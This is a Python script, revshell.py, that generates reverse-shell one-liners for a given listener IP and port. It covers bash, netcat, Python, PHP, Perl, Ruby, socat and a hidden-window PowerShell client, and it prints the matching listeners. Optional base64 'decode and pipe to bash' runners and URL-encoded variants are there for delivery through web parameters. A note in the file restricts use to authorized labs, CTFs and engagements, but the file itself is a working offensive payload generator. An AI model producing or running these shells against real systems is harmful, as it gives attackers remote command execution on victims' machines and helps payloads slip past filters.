#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
revshell.py - Portable reverse-shell one-liner generator.

Prints ready-to-paste reverse shells for a given LHOST/LPORT across common
interpreters, plus the matching listener. Optional URL-encoded and base64-wrapped
variants for delivery through web parameters. Standalone (stdlib), so it works
off the archpwm box too.

Authorized / educational use only: reverse shells are for machines you own or are
explicitly permitted to test (labs, HTB/THM, CTFs, contracted engagements).

Examples:
    python3 revshell.py 10.10.14.5 4444
    python3 revshell.py 10.10.14.5 4444 -t bash --base64
    python3 revshell.py 10.10.14.5 9001 --list
    python3 revshell.py 10.10.14.5 4444 -t python3 --url-encode
"""

import argparse
import base64 as b64
import sys
from urllib.parse import quote

PAYLOADS = {
    "bash":       "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc":         "nc -e /bin/sh {ip} {port}",
    "nc-mkfifo":  "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "python3":    ("python3 -c 'import os,pty,socket;s=socket.socket();"
                   "s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];"
                   "pty.spawn(\"/bin/bash\")'"),
    "php":        "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl":       ("perl -e 'use Socket;$i=\"{ip}\";$p={port};"
                   "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                   "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
                   "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"),
    "ruby":       ("ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
                   "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
    "socat":      "socat TCP:{ip}:{port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
    "powershell": ("powershell -nop -w hidden -c \"$c=New-Object "
                   "Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();"
                   "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
                   "{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                   "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
                   "$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);"
                   "$s.Flush()}\""),
}


def listener(port):
    return (f"rlwrap nc -lvnp {port}      # generic\n"
            f"    socat file:`tty`,raw,echo=0 TCP-LISTEN:{port}   # for the socat/pty shell")


def render(name, ip, port, url_encode, base64_wrap):
    payload = PAYLOADS[name].format(ip=ip, port=port)
    lines = [f"[{name}]", f"    {payload}"]
    if base64_wrap:
        enc = b64.b64encode(payload.encode()).decode()
        lines.append(f"    # base64: echo {enc} | base64 -d | bash")
    if url_encode:
        lines.append(f"    # url:    {quote(payload)}")
    return "\n".join(lines)


def main():
    p = argparse.ArgumentParser(
        description="Portable reverse-shell one-liner generator.",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("lhost", nargs="?", help="listener IP (LHOST)")
    p.add_argument("lport", nargs="?", default="4444", help="listener port (default 4444)")
    p.add_argument("-t", "--type", choices=sorted(PAYLOADS), help="one shell type (default: all)")
    p.add_argument("--list", action="store_true", help="list available shell types and exit")
    p.add_argument("--url-encode", action="store_true", help="also print a URL-encoded variant")
    p.add_argument("--base64", action="store_true", help="also print a base64-wrapped bash runner")
    args = p.parse_args()

    if args.list:
        print("Types:", ", ".join(sorted(PAYLOADS)))
        return
    if not args.lhost:
        p.error("LHOST is required (e.g. revshell.py 10.10.14.5 4444)")

    names = [args.type] if args.type else list(PAYLOADS)
    print(f"[*] Listener:\n    {listener(args.lport)}\n")
    for name in names:
        print(render(name, args.lhost, args.lport, args.url_encode, args.base64))
        print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
